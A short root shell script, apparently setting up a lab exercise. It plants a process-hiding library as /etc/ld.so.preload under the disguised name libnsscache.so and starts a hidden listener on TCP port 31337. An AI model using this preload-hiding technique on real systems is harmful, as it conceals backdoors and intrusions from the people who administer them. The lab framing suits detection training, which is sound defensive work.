#!/bin/sh
# hider.so via /etc/ld.so.preload, hiding a process named lab-hidden that listens on TCP 31337.
# Runs as root inside a lab machine. Stand-ins are expected in /lab/standins.
set -eu
SI=/lab/standins
need() { [ -e "$SI/$1" ] || { echo "$0: $SI/$1 is missing (copy the stand-ins in first)" >&2; exit 1; }; }
need hider.so
need listener
install -m 644 "$SI/hider.so" /usr/local/lib/libnsscache.so
install -m 755 "$SI/listener" /usr/local/sbin/lab-hidden
setsid nohup /usr/local/sbin/lab-hidden 31337 </dev/null >/dev/null 2>&1 &
sleep 1
# Last, so the shell running this script is not hooked halfway.
echo /usr/local/lib/libnsscache.so > /etc/ld.so.preload
